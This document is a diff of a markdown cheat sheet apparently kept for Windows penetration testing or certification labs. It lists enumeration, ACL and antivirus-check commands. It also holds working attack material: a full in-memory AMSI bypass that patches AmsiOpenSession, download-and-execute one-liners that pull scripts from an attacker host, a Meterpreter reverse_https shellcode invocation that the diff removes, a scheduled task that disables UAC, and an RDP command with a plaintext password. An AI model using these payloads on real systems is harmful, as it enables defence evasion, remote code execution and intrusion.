@@ -12,146 +12,195 @@ The script there is obfuscated but additional levels of obfuscation are welcome.
 2. Run manual commands if needed 
 3. If windows version is old then try potatoes if privileges are there
 
-### Manual enum
+### Basic System enumeration
 
 ```powershell
-
-# see script exec policy
-
+# 1. user
 Get-ExecutionPolicy -Scope CurrentUser
+Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force
 
-# set to unrestricted
+## 2. History
 
-Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
-
-# see user's history
+# PowerShell History
 Get-History
+Get-Content (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
 
-# check PSReadline history
-$psReadlineOptions = Get-PSReadlineOption; $historySavePath = $psReadlineOptions.HistorySavePath; if (Test-Path $historySavePath) { Get-Content $historySavePath } else { Write-Host "PS History File does not exist" }
+## 3. Quick Navigation
 
-# check event, for blocked scripts for example
+cd $env:TEMP
+cd C:\Users\$env:USERNAME\Desktop
 
-Get-WinEvent -FilterHashtable @{logname='Microsoft-Windows-PowerShell/Operational'; ID=4104} | Where-Object { $_.Message -like '*script block*' } | Format-List
-
-# get into temp dir which is typically writable
-cd $env:temp
+## 4. System Information
 
 systeminfo
 
-Get-ComputerInfo
+Get-ComputerInfo | Select-Object WindowsProductName, WindowsVersion, OsArchitecture, CsManufacturer, CsModel
 
-# search for interesting files
+## 5. Users & Groups
 
-Get-ChildItem -Path .\ -Include  *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.kdbx,*.ini -File -Recurse -ErrorAction SilentlyContinue
+net user
+net localgroup
+net localgroup Administrators
 
-# in cmd 
-dir /s /b flag.txt
+Get-LocalUser
+Get-LocalGroup
+Get-LocalGroupMember Administrators
 
-# see also hidden files
+## 6. Installed Software
+
+
+wmic product get name,version
+
+Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | Select DisplayName, DisplayVersion
+Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | Select DisplayName, DisplayVersion
+
+## 7. Running Processes
+
+
+Get-Process | Select-Object ProcessName, Id, Path | Sort ProcessName
+
+## 8. Interesting Files (Fast Search)
+
+# Quick search in current + subfolders
+Get-ChildItem -Path . -Recurse -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.kdbx,*.ini,*.cfg,*.config -File -ErrorAction SilentlyContinue | Select FullName
+
+# Hidden files
 Get-ChildItem . -Force
 
-# download stuff if needed
-iwr -uri http://IP -outfile some.exe
+dir /s /b *.txt *.pdf *.xls *.xlsx *.doc *.docx *.kdbx 2>nul
+dir /s /b /a:h
 
-# test locally connections
-Test-NetConnection -Port 445 192.168.50.111
+## 9. Network & Connections
 
-# run x86 version of powershell from cmd.exe
+Test-NetConnection -Port 445 192.168.1.100
+netstat -ano | findstr LISTENING
+
+## 10. Download Files (if needed)
+
+iwr -Uri http://<attacker-ip>/file.exe -OutFile file.exe
+
+## 11. Run x86 PowerShell (from CMD)
 
 %SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
 
+
+## 12. Find writable directories (common for privesc)**
+
+Get-ChildItem C:\ -Recurse -Directory -ErrorAction SilentlyContinue | Where-Object { (Get-Acl $_.FullName).Access | Where-Object { $_.FileSystemRights -match "Write" -and $_.IdentityReference -match "Everyone|Users|Authenticated" } }
+
+## **Check for unquoted service paths (quick)**
+
+wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """
+
+## **PowerShell version & AV**
+
+$PSVersionTable
+Get-Command *defender*
 ```
 
-### Helpful stuff
+---
+
+**Recommended Workflow (Fast Enumeration)**
+
+1. systeminfo
+2. CHECK execution policy
+3. Check users/groups
+4. Check installed software
+5. Search interesting files in Desktop, Documents, Downloads
+6. Check processes
+7. Network connections
+### ACL for folders and files
+
+I use cmd `icacls` for ACLs because it is more straightforward than powershell `Get-ACL`.
 
 ```powershell
+## View Permissions
 
-#reboot
+icacls "C:\Folder"
+icacls "C:\Folder" /T          # Recursive
 
-shutdown /r /t 0
+# Grant permissions
+icacls "C:\Folder" /grant DOMAIN\User:(F)                    # Full Control
+icacls "C:\Folder" /grant DOMAIN\User:(M)                    # Modify
+icacls "C:\Folder" /grant DOMAIN\User:(RX)                   # Read & Execute
+icacls "C:\Folder" /grant Everyone:(R)                       # Read
 
-# RDP into machine
+# With inheritance (best for folders)
+icacls "C:\Folder" /grant DOMAIN\User:(OI)(CI)(M) /T /C
 
-`xfreerdp /cert:ignore /dynamic-resolution /clipboard /auto-reconnect /d:domain.com /u:jeff /p:'HenchmanPutridBonbon11' /v:192.168.244.75`
+# Replace existing permissions for user
+icacls "C:\Folder" /grant:r DOMAIN\User:(OI)(CI)(M)
 
-# use `/pth:` for pass the hash
+# Remove user
+icacls "C:\Folder" /remove DOMAIN\User /T /C
 
-net user
+# Reset to inherited defaults
+icacls "C:\Folder" /reset /T /C
 
-Get-LocalUser
+# Disable inheritance
+icacls "C:\Folder" /inheritance:r      # Remove all inherited
+icacls "C:\Folder" /inheritance:d      # Disable inheritance (keep explicit)
 
-# get list of local groups
-Get-LocalGroup
+# Change owner
+icacls "C:\Folder" /setowner DOMAIN\Admin /T /C
 
-net localgroup
-
-# get group members oLof SomeGroup
-Get-LocalGroupMember SomeGroup
-
-net localgroup SomeGroup
-
-# cmd
-
-wmic product get name, version
-
-
-# all
-
-Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
-
-# 32 bit
-
-Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
-
-# 64 bit
-
-Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
-
-Get-Process | Select-Object ProcessName, Path
-
-Get-Process -Name | Get-Acl
-
-Get-Process | ForEach-Object { $_.Path } 
-
-
+# Deny
+icacls "C:\Folder" /deny DOMAIN\User:(F)
 ```
 
-### NetBIOS
+**Useful switches**
 
-NetBIOS Name is a 16-byte name for a networking service or function on a machine running Microsoft Windows Server. NetBIOS names are a more friendly way of identifying computers on a network than network numbers.
+- /T = Recursive (all subfolders/files)
+- /C = Continue on errors
+- /Q = Quiet mode
+- /R = Replace (used with /grant:r)
 
-* local: `nbtstat -n`
+#### icacls Permission Meanings
 
-* remote scan: `sudo nmap -sU --script nbstat.nse -p137 <host>`
-
-### PowerSploit
-
-* PowerSploit is extramely useful for actions on objective after reconaissance with `Privesc`
-* Each single Module can accessed as so after hosting the directory
-* for more info see: https://resources.infosecinstitute.com/topic/powershell-toolkit-powersploit/
 
 ```powershell
-IEX (New-Object Net.WebClient).DownloadString(“http://10.0.0.14:8000/CodeExecution/Invoke-Shellcode.ps1”)
-
-Get-Help Invoke-Shellcode
-
-Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 10.0.0.14 -Lport 4444 -Force
-
+C:\Folder BUILTIN\Administrators:(I)(F)
+           DOMAIN\Users:(OI)(CI)(RX)
 ```
 
-Following metasploit payloads are supported
+**Basic Rights**
 
-```bash
-windows/meterpreter/reverse_http
-windows/meterpreter/reverse_https
+- F = Full Control
+- M = Modify
+- RX = Read & Execute
+- R = Read
+- W = Write
+- D = Delete
+
+**Advanced Rights**
+
+- WDAC = Write DAC (change permissions)
+- WO = Write Owner (take ownership)
+
+**Inheritance Flags**
+
+- (OI) = Object Inherit → applies to files
+- (CI) = Container Inherit → applies to subfolders
+- (IO) = Inherit Only → does not apply to this folder
+- (I) = Inherited from parent
+- (N) = No inheritance
+
+### AV check
+```powershell
+
+wmic /namespace:\\root\securitycenter2 path antivirusproduct
+
+Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct
+
+Get-Service WinDefend
+
+Get-NetFirewalLProfile
+
+Get-EventLog -List
+
+Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct
+
 ```
-
-### Basic usage
-* start PS from cmd bypassing the execution policy: `powershell -ep bypass`
-* importing modules is possbile with dot notation: `. .\PowerView.ps1`
-
-
 
 ## UAC bypass
 
@@ -160,7 +209,7 @@ windows/meterpreter/reverse_https
 * find out UAC level: `REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin`
 
 * UAC can be bypassed using https://github.com/turbo/zero2hero
-OR 
+
 
 ```powershell
 
@@ -174,15 +223,65 @@ Register-ScheduledTask -TaskName "DisableUAC" -Action $action -Trigger $trigger 
 
 ```
 
-## Antivirus bypass
+## AMSI bypass
 
-### Detect AV Version
+```powershell
+function LookupFunc {  
+Param ($moduleName, $functionName)  
+$assem = ([AppDomain]::CurrentDomain.GetAssemblies() |  
+Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].  
+Equals('System.dll')  
+}).GetType('Microsoft.Win32.UnsafeNativeMethods')  
+$tmp=@()  
+$assem.GetMethods() | ForEach-Object {If($_.Name -like "Ge*P*oc*ddress") {$tmp+=$_}}  
+return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,  
+@($moduleName)), $functionName))  
+}  
+  
+  
+function getDelegateType {  
+Param (  
+[Parameter(Position = 0, Mandatory = $True)] [Type[]]  
+$func, [Parameter(Position = 1)] [Type] $delType = [Void]  
+)  
+$type = [AppDomain]::CurrentDomain.  
+DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),  
+[System.Reflection.Emit.AssemblyBuilderAccess]::Run).  
+DefineDynamicModule('InMemoryModule', $false).  
+DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass,  
+AutoClass', [System.MulticastDelegate])  
+  
+$type.  
+DefineConstructor('RTSpecialName, HideBySig, Public',  
+[System.Reflection.CallingConventions]::Standard, $func).  
+SetImplementationFlags('Runtime, Managed')  
+  
+$type.  
+DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType,  
+$func). SetImplementationFlags('Runtime, Managed')  
+return $type.CreateType()  
+}  
+  
+  
+[IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession  
+$oldProtectionBuffer = 0  
+$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))  
+$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)  
+$buf = [Byte[]] (0x48,0x31,0xc9)  
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 3)
+```
 
-* works with PS 3.0 and higher
-Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct
+Save as `patch.ps1` download and run like:
 
-### TBD bypass 
+```powershell
+powershell -ep bypass -c "wget 'http://xxx.xxx.xxx.20:7777/patch.ps1' -O patch.ps1; .\patch.ps1 ");
+```
 
+Then any other payload script can be run:
+
+```powershell
+powershell -ep bypass -c "IEX(New-Object Net.WebClient).downloadString('http://xxx.xxx.xxx.20:7777/PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Audit -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML,CSV,XML"
+```
 
 ## Download and Upload stuff
 
